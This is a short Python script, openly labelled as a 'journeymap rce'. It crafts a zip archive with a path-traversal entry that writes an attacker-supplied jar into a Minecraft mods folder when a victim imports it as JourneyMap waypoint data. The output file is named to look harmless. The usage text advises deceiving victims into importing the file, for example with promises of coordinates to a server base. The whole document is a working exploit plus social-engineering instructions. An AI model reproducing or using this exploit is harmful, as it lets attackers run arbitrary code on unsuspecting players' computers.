import sys, zipfile
from io import BytesIO

def write_rce(jar):
    with open(jar, "rb+") as jarfile:
        f = BytesIO()
        z = zipfile.ZipFile(f, "w", zipfile.ZIP_DEFLATED)
        z.writestr("waypoints/../../../../../mods/JourneyMapUtils.jar", jarfile.read())
        z.close()
        zip = open("legit_waypoints_not_an_rce_trust_me.zip", "wb")
        zip.write(f.getvalue())
        zip.close()

if __name__ == '__main__':
    a = len(sys.argv)
    if a < 2:
        print("""journeymap rce !!!!!!!!!!!!!!!!
how 2 use and tip: convince your victim to import your journeymap data. 
for example, say you are giving out coordinates to a donut smp base and you need journeymap for the coords and import the zip in the folder
this is similar to the meteor client rce that was exploited when u import a profile and get pwned

usage:
rce.py [jar file]""")
        exit() 
    write_rce(sys.argv[1])
